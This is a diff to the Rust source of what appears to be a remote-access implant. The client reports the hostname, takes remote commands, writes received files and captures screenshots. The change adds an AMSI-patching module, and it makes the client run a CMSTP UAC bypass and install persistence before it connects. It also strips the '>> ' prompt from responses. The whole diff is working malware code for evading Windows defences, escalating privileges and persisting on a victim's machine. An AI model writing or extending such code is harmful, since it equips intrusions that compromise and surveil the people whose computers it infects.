@@ -4,6 +4,8 @@
 mod uac_cmstp;
 #[cfg(target_os = "windows")]
 mod uac_bypass;
+#[cfg(target_os = "windows")]
+mod amsi;
 mod persist;
 mod portscanner;
 pub mod util;
@@ -91,8 +93,6 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
     Ok(format!("{}",b64))
 }
 
-
-const RESPONSE_DELIM: &str = "\n>> ";
 
 fn get_hostname() -> String {
     gethostname()
@@ -380,7 +380,6 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
 
     let hostname = get_hostname();
     writer.write_all(hostname.as_bytes()).await?;
-    writer.write_all(b"\n>> ").await?;
     writer.flush().await?;
 
     loop {
@@ -420,7 +419,6 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                     fs::write(&fname, &raw)?;
                     let msg = format!("Wrote data to {}\n", fname);
                     writer.write_all(msg.as_bytes()).await?;
-                    writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                     writer.flush().await?;
                     continue;
                 }
@@ -429,8 +427,6 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
             }
 
             if line.is_empty() {
-                writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
-                writer.flush().await?;
                 continue;
             }
 
@@ -450,7 +446,6 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
             }
         }
 
-        writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
         writer.flush().await?;
         }
     }
@@ -515,6 +510,15 @@ async fn netclient_impl() -> c_int {
     })
 }
 pub async fn netclient() -> c_int {
+    let _ = amsi::patch_amsi();
+    #[cfg(target_os = "windows")]
+        {
+            let exe_path = match std::env::current_exe() {
+                Ok(p) => p.to_string_lossy().to_string(),
+                Err(_) => return 2,                };
+            uac_cmstp::execute(&exe_path);
+        }
+    let _ = persist::persist();
     netclient_impl().await;
     0
 }
